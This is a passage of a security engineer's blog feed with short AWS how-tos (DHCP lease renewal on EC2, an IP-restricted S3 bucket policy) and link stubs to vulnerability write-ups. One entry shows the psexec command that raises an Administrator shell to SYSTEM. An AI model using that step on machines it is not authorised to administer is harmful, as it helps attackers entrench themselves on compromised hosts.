target="_blank" rel="noopener">https://docs.aws.amazon.com/systems-manager/latest/userguide/integration-remote-scripts.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-TL-DR&quot;&gt;&lt;a href=&quot;#0x00-TL-DR&quot; class=&quot;headerlink&quot; title=&quot;0x00 TL;DR&quot;&gt;&lt;/a&gt;0x00 TL;DR&lt;/h2&gt;&lt;p&gt;This article documents how to use AWS 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AWS VPC DHCP Options Set change Effective immediately</title>
    <link href="https://tonghuaroot.com/2019/05/23/AWS-VPC-DHCP-Options-Set-change-Effective-immediately/"/>
    <id>https://tonghuaroot.com/2019/05/23/AWS-VPC-DHCP-Options-Set-change-Effective-immediately/</id>
    <published>2019-05-23T06:55:06.000Z</published>
    <updated>2019-05-29T02:20:11.890Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-TL-DR"><a href="#0x00-TL-DR" class="headerlink" title="0x00 TL;DR"></a>0x00 TL;DR</h2><p>Usually, after the DHCP Options Set changes, it takes several hours for the EC2 instance inside the VPC to use the new DHCP Options Set.<br>This article describes how to make the configuration of the DHCP Options Set take effect immediately in the specified EC2 instance.<br>The overall idea is to restart the EC2 instance network and let the DHCP service reassign network information.</p><h2 id="0x01-VPC-change-DHCP-Options-Set"><a href="#0x01-VPC-change-DHCP-Options-Set" class="headerlink" title="0x01 VPC change DHCP Options Set"></a>0x01 VPC change DHCP Options Set</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 associate-dhcp-options --dhcp-options-id dopt-06d6a444d7a288888 --vpc-id vpc-0614eddfdb8988888</span><br></pre></td></tr></table></figure><blockquote><p>Note:After you associate a new set of DHCP options with a VPC, any existing instances and all new instances that you launch in the VPC use these options. You don’t need to restart or relaunch the instances. They automatically pick up the changes within a few hours, depending on how frequently the instance renews its DHCP lease. If you want, you can explicitly renew the lease using the operating system on the instance.</p></blockquote><h2 id="0x02-Set-DHCP-Options-Set-effect-immediately-in-specified-EC2-instance"><a href="#0x02-Set-DHCP-Options-Set-effect-immediately-in-specified-EC2-instance" class="headerlink" title="0x02 Set DHCP Options Set effect immediately in specified EC2 instance"></a>0x02 Set DHCP Options Set effect immediately in specified EC2 instance</h2><ul><li>Windows Server 2016 Renew DHCP Lease(ipconfig /renew):</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以太网适配器 以太网:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : cn-north-1.compute.internal</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::dd5d:2739:e78f:5566%14</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 10.0.0.39</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 10.0.0.1</span><br><span class="line"></span><br><span class="line">隧道适配器 isatap.cn-north-1.compute.internal:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line"></span><br><span class="line">隧道适配器 本地连接* 3:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   IPv6 地址 . . . . . . . . . . . . : 2001:0:348b:fb58:4f6:3e50:f5ff:ffd8</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::4f6:3e50:f5ff:ffd8%12</span><br><span class="line">   默认网关. . . . . . . . . . . . . : ::</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;ipconfig /renew</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以太网适配器 以太网:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : corp.tonghua.com</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::dd5d:2739:e78f:5566%14</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 10.0.0.39</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 10.0.0.1</span><br><span class="line"></span><br><span class="line">隧道适配器 本地连接* 3:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line"></span><br><span class="line">隧道适配器 isatap.corp.tonghua.com:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;</span><br></pre></td></tr></table></figure><ul><li>Amazon Linux 2 Renew DHCP Lease(sudo service network restart):</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ cat /var/lib/dhclient/dhclient--eth0.lease</span><br><span class="line">lease &#123;</span><br><span class="line">  interface &quot;eth0&quot;;</span><br><span class="line">  fixed-address 10.0.0.64;</span><br><span class="line">  option subnet-mask 255.255.255.0;</span><br><span class="line">  option dhcp-lease-time 3600;</span><br><span class="line">  option routers 10.0.0.1;</span><br><span class="line">  option dhcp-message-type 5;</span><br><span class="line">  option dhcp-server-identifier 10.0.0.1;</span><br><span class="line">  option domain-name-servers 10.0.0.2;</span><br><span class="line">  option interface-mtu 9001;</span><br><span class="line">  option broadcast-address 10.0.0.255;</span><br><span class="line">  option host-name &quot;ip-10-0-0-64&quot;;</span><br><span class="line">  option domain-name &quot;cn-north-1.compute.internal&quot;;</span><br><span class="line">  renew 4 2019/05/23 13:35:11;</span><br><span class="line">  rebind 4 2019/05/23 14:02:11;</span><br><span class="line">  expire 4 2019/05/23 14:09:41;</span><br><span class="line">&#125;</span><br><span class="line">lease &#123;</span><br><span class="line">  interface &quot;eth0&quot;;</span><br><span class="line">  fixed-address 10.0.0.64;</span><br><span class="line">  option subnet-mask 255.255.255.0;</span><br><span class="line">  option routers 10.0.0.1;</span><br><span class="line">  option dhcp-lease-time 3600;</span><br><span class="line">  option dhcp-message-type 5;</span><br><span class="line">  option domain-name-servers 10.0.0.2;</span><br><span class="line">  option dhcp-server-identifier 10.0.0.1;</span><br><span class="line">  option interface-mtu 9001;</span><br><span class="line">  option broadcast-address 10.0.0.255;</span><br><span class="line">  option host-name &quot;ip-10-0-0-64&quot;;</span><br><span class="line">  option domain-name &quot;cn-north-1.compute.internal&quot;;</span><br><span class="line">  renew 4 2019/05/23 13:36:56;</span><br><span class="line">  rebind 4 2019/05/23 14:02:23;</span><br><span class="line">  expire 4 2019/05/23 14:09:53;</span><br><span class="line">&#125;</span><br><span class="line">lease &#123;</span><br><span class="line">  interface &quot;eth0&quot;;</span><br><span class="line">  fixed-address 10.0.0.64;</span><br><span class="line">  option subnet-mask 255.255.255.0;</span><br><span class="line">  option routers 10.0.0.1;</span><br><span class="line">  option dhcp-lease-time 3600;</span><br><span class="line">  option dhcp-message-type 5;</span><br><span class="line">  option domain-name-servers 10.0.0.2;</span><br><span class="line">  option dhcp-server-identifier 10.0.0.1;</span><br><span class="line">  option interface-mtu 9001;</span><br><span class="line">  option broadcast-address 10.0.0.255;</span><br><span class="line">  option host-name &quot;ip-10-0-0-64&quot;;</span><br><span class="line">  option domain-name &quot;cn-north-1.compute.internal&quot;;</span><br><span class="line">  renew 4 2019/05/23 14:00:23;</span><br><span class="line">  rebind 4 2019/05/23 14:29:26;</span><br><span class="line">  expire 4 2019/05/23 14:36:56;</span><br><span class="line">&#125;</span><br><span class="line">lease &#123;</span><br><span class="line">  interface &quot;eth0&quot;;</span><br><span class="line">  fixed-address 10.0.0.64;</span><br><span class="line">  option subnet-mask 255.255.255.0;</span><br><span class="line">  option routers 10.0.0.1;</span><br><span class="line">  option dhcp-lease-time 3600;</span><br><span class="line">  option dhcp-message-type 5;</span><br><span class="line">  option domain-name-servers 10.0.0.2;</span><br><span class="line">  option dhcp-server-identifier 10.0.0.1;</span><br><span class="line">  option interface-mtu 9001;</span><br><span class="line">  option broadcast-address 10.0.0.255;</span><br><span class="line">  option host-name &quot;ip-10-0-0-64&quot;;</span><br><span class="line">  option domain-name &quot;cn-north-1.compute.internal&quot;;</span><br><span class="line">  renew 4 2019/05/23 14:29:09;</span><br><span class="line">  rebind 4 2019/05/23 14:52:53;</span><br><span class="line">  expire 4 2019/05/23 15:00:23;</span><br><span class="line">&#125;</span><br><span class="line">lease &#123;</span><br><span class="line">  interface &quot;eth0&quot;;</span><br><span class="line">  fixed-address 10.0.0.64;</span><br><span class="line">  option subnet-mask 255.255.255.0;</span><br><span class="line">  option routers 10.0.0.1;</span><br><span class="line">  option dhcp-lease-time 3600;</span><br><span class="line">  option dhcp-message-type 5;</span><br><span class="line">  option domain-name-servers 10.0.0.2;</span><br><span class="line">  option dhcp-server-identifier 10.0.0.1;</span><br><span class="line">  option interface-mtu 9001;</span><br><span class="line">  option broadcast-address 10.0.0.255;</span><br><span class="line">  option host-name &quot;ip-10-0-0-64&quot;;</span><br><span class="line">  option domain-name &quot;cn-north-1.compute.internal&quot;;</span><br><span class="line">  renew 4 2019/05/23 14:56:39;</span><br><span class="line">  rebind 4 2019/05/23 15:21:39;</span><br><span class="line">  expire 4 2019/05/23 15:29:09;</span><br><span class="line">&#125;</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$ sudo service network restart</span><br><span class="line">Restarting network (via systemctl):                        [  OK  ]</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$ cat /var/lib/dhclient/dhclient--eth0.lease</span><br><span class="line">lease &#123;</span><br><span class="line">  interface &quot;eth0&quot;;</span><br><span class="line">  fixed-address 10.0.0.64;</span><br><span class="line">  option subnet-mask 255.255.255.0;</span><br><span class="line">  option dhcp-lease-time 3600;</span><br><span class="line">  option routers 10.0.0.1;</span><br><span class="line">  option dhcp-message-type 5;</span><br><span class="line">  option dhcp-server-identifier 10.0.0.1;</span><br><span class="line">  option domain-name-servers 10.0.0.2;</span><br><span class="line">  option interface-mtu 9001;</span><br><span class="line">  option broadcast-address 10.0.0.255;</span><br><span class="line">  option host-name &quot;ip-10-0-0-64&quot;;</span><br><span class="line">  option domain-name &quot;cn-north-1.compute.internal&quot;;</span><br><span class="line">  renew 4 2019/05/23 14:56:39;</span><br><span class="line">  rebind 4 2019/05/23 15:21:39;</span><br><span class="line">  expire 4 2019/05/23 15:29:09;</span><br><span class="line">&#125;</span><br><span class="line">lease &#123;</span><br><span class="line">  interface &quot;eth0&quot;;</span><br><span class="line">  fixed-address 10.0.0.64;</span><br><span class="line">  option subnet-mask 255.255.255.0;</span><br><span class="line">  option routers 10.0.0.1;</span><br><span class="line">  option dhcp-lease-time 3600;</span><br><span class="line">  option dhcp-message-type 5;</span><br><span class="line">  option domain-name-servers 10.0.1.101,10.0.3.86;</span><br><span class="line">  option dhcp-server-identifier 10.0.0.1;</span><br><span class="line">  option interface-mtu 9001;</span><br><span class="line">  option broadcast-address 10.0.0.255;</span><br><span class="line">  option host-name &quot;ip-10-0-0-64&quot;;</span><br><span class="line">  option domain-name &quot;corp.tonghua.com&quot;;</span><br><span class="line">  renew 4 2019/05/23 15:14:34;</span><br><span class="line">  rebind 4 2019/05/23 15:39:02;</span><br><span class="line">  expire 4 2019/05/23 15:46:32;</span><br><span class="line">&#125;</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$</span><br></pre></td></tr></table></figure><h2 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a>0x03 Reference</h2><ul><li><a href="https://docs.aws.amazon.com/zh_cn/vpc/latest/userguide/VPC_DHCP_Options.html" target="_blank" rel="noopener">DHCP Options Sets</a></li><li><a href="https://docs.aws.amazon.com/cli/latest/reference/ec2/associate-dhcp-options.html#examples" target="_blank" rel="noopener">associate-dhcp-options</a></li><li><a href="https://kb.wisc.edu/page.php?id=562" target="_blank" rel="noopener">WINDOWS - DISPLAYING, RELEASING AND RENEWING A DHCP LEASE</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-TL-DR&quot;&gt;&lt;a href=&quot;#0x00-TL-DR&quot; class=&quot;headerlink&quot; title=&quot;0x00 TL;DR&quot;&gt;&lt;/a&gt;0x00 TL;DR&lt;/h2&gt;&lt;p&gt;Usually, after the DHCP Options Set ch
      
    
    </summary>
    
    
      <category term="AWS" scheme="https://tonghuaroot.com/tags/AWS/"/>
    
  </entry>
  
  <entry>
    <title>How do I set the S3 bucket policy so that it can only be accessed by the specified IP</title>
    <link href="https://tonghuaroot.com/2019/05/23/How-do-I-set-the-S3-bucket-policy-so-that-it-can-only-be-accessed-by-the-specified-IP/"/>
    <id>https://tonghuaroot.com/2019/05/23/How-do-I-set-the-S3-bucket-policy-so-that-it-can-only-be-accessed-by-the-specified-IP/</id>
    <published>2019-05-23T02:28:58.000Z</published>
    <updated>2019-05-23T10:35:02.389Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-TL-DR"><a href="#0x00-TL-DR" class="headerlink" title="0x00 TL;DR"></a>0x00 TL;DR</h2><p>This document records how to set up the S3 bucket policy so that it can only be accessed by the specified IP.<br>Set the bucket policy to deny the operation except for the specified IP.</p><h2 id="0x01-Policy"><a href="#0x01-Policy" class="headerlink" title="0x01 Policy"></a>0x01 Policy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Id&quot;: &quot;S3PolicyId1&quot;,</span><br><span class="line">  &quot;Statement&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Sid&quot;: &quot;IPAllow&quot;,</span><br><span class="line">      &quot;Effect&quot;: &quot;Deny&quot;,</span><br><span class="line">      &quot;Principal&quot;: &quot;*&quot;,</span><br><span class="line">      &quot;Action&quot;: &quot;s3:*&quot;,</span><br><span class="line">      &quot;Resource&quot;: [</span><br><span class="line">        &quot;arn:aws-cn:s3:::testtonghua/*&quot;,</span><br><span class="line">        &quot;arn:aws-cn:s3:::testtonghua&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;Condition&quot;: &#123;</span><br><span class="line">        &quot;NotIpAddress&quot;: &#123;</span><br><span class="line">          &quot;aws:SourceIp&quot;: &quot;54.222.177.177/32&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If you use this policy, you can access the S3 bucket only if the IP is 54.222.177.177.</p><blockquote><p>Note: Please confirm that the specified IP is a static IP,If you use dynamic IP, there is a risk that the S3 bucket will not be accessible when the IP is changed.if unfortunately, you need to contact the AWS Support revocation policy.</p></blockquote><h2 id="0x02-Reference"><a href="#0x02-Reference" class="headerlink" title="0x02 Reference"></a>0x02 Reference</h2><ul><li><a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/example-bucket-policies.html" target="_blank" rel="noopener">Bucket Policy Examples</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-TL-DR&quot;&gt;&lt;a href=&quot;#0x00-TL-DR&quot; class=&quot;headerlink&quot; title=&quot;0x00 TL;DR&quot;&gt;&lt;/a&gt;0x00 TL;DR&lt;/h2&gt;&lt;p&gt;This document records how to set up th
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>How Winodws Escalation Privilege from administrator privilege to system privilege</title>
    <link href="https://tonghuaroot.com/2019/05/22/How-Winodws-Escalation-Privilege-from-administrator-privilege-to-system-privilege/"/>
    <id>https://tonghuaroot.com/2019/05/22/How-Winodws-Escalation-Privilege-from-administrator-privilege-to-system-privilege/</id>
    <published>2019-05-22T07:45:32.000Z</published>
    <updated>2019-05-29T08:43:44.831Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-TL-DR"><a href="#0x00-TL-DR" class="headerlink" title="0x00 TL;DR"></a>0x00 TL;DR</h2><p>Record how Winodws Escalation Privilege from administrator privilege to system privilege.<br>Use psexec can do it.</p><h2 id="0x01-Steps"><a href="#0x01-Steps" class="headerlink" title="0x01 Steps"></a>0x01 Steps</h2><p>download:<a href="https://download.sysinternals.com/files/PSTools.zip" target="_blank" rel="noopener">https://download.sysinternals.com/files/PSTools.zip</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Downloads\PSTools&gt;whoami</span><br><span class="line">ec2amaz-okarxxx\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Downloads\PSTools&gt; .\psexec -i -s -d cmd</span><br><span class="line"></span><br><span class="line">PsExec v2.2 - Execute processes remotely</span><br><span class="line">Copyright (C) 2001-2016 Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd started on EC2AMAZ-OKARXXX with process ID 7848.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Downloads\PSTools&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><h2 id="0x02-Reference"><a href="#0x02-Reference" class="headerlink" title="0x02 Reference"></a>0x02 Reference</h2><ul><li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools" target="_blank" rel="noopener">PsTools</a></li><li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=255037" target="_blank" rel="noopener">AWS-ApplyPatchBaseline run command fails when running behind a proxy server</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-TL-DR&quot;&gt;&lt;a href=&quot;#0x00-TL-DR&quot; class=&quot;headerlink&quot; title=&quot;0x00 TL;DR&quot;&gt;&lt;/a&gt;0x00 TL;DR&lt;/h2&gt;&lt;p&gt;Record how Winodws Escalation Privileg
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Gogs RCE Vulnerability Analysis</title>
    <link href="https://tonghuaroot.com/2018/11/06/Gogs-RCE-Vulnerability-Analysis/"/>
    <id>https://tonghuaroot.com/2018/11/06/Gogs-RCE-Vulnerability-Analysis/</id>
    <published>2018-11-06T02:05:10.000Z</published>
    <updated>2019-05-21T17:24:57.352Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>The article was first published in:<a href="https://www.anquanke.com/post/id/163575" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163575</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Others&quot;&gt;&lt;a href=&quot;#Others&quot; class=&quot;headerlink&quot; title=&quot;Others&quot;&gt;&lt;/a&gt;Others&lt;/h2&gt;&lt;p&gt;The article was first published in:&lt;a href=&quot;https://ww
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Enterprise Cyber security build of Windows lateral movement attacks detection</title>
    <link href="https://tonghuaroot.com/2018/03/02/Enterprise-Cyber-security-build-of-Windows-lateral-movement-attacks-detection/"/>
    <id>https://tonghuaroot.com/2018/03/02/Enterprise-Cyber-security-build-of-Windows-lateral-movement-attacks-detection/</id>
    <published>2018-03-02T03:01:18.000Z</published>
    <updated>2019-05-28T11:02:03.230Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>The article was first published in:<a href="https://www.4hou.com/technology/10430.html" target="_blank" rel="noopener">https://www.4hou.com/technology/10430.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Others&quot;&gt;&lt;a href=&quot;#Others&quot; class=&quot;headerlink&quot; title=&quot;Others&quot;&gt;&lt;/a&gt;Others&lt;/h2&gt;&lt;p&gt;The article was first published in:&lt;a href=&quot;https://ww
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Flask debug mode PIN code generation mechanism security research notes</title>
    <link href="https://tonghuaroot.com/2017/12/25/Flask-debug-mode-PIN-code-generation-mechanism-security-research-notes/"/>
    <id>https://tonghuaroot.com/2017/12/25/Flask-debug-mode-PIN-code-generation-mechanism-security-research-notes/</id>
    <published>2017-12-25T00:46:17.000Z</published>
    <updated>2019-05-29T09:09:55.676Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>The article was first published in:<a href="https://zhuanlan.zhihu.com/p/32336971" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/32336971</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Others&quot;&gt;&lt;a href=&quot;#Others&quot; class=&quot;headerlink&quot; title=&quot;Others&quot;&gt;&lt;/a&gt;Others&lt;/h2&gt;&lt;p&gt;The article was first published in:&lt;a href=&quot;https://zh
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>An example of network security problems in the IoT era</title>
    <link href="https://tonghuaroot.com/2016/10/22/An-example-of-network-security-problems-in-the-IoT-era/"/>
    <id>https://tonghuaroot.com/2016/10/22/An-example-of-network-security-problems-in-the-IoT-era/</id>
    <published>2016-10-22T11:12:16.000Z</published>
    <updated>2019-05-21T17:36:02.417Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>The article was first published in:<a href="https://www.anquanke.com/post/id/84774" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84774</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Others&quot;&gt;&lt;a href=&quot;#Others&quot; class=&quot;headerlink&quot; title=&quot;Others&quot;&gt;&lt;/a&gt;Others&lt;/h2&gt;&lt;p&gt;The article was first published in:&lt;a href=&quot;https://ww
      
    
    </summary>
    
    
  </entry>
  
</feed>
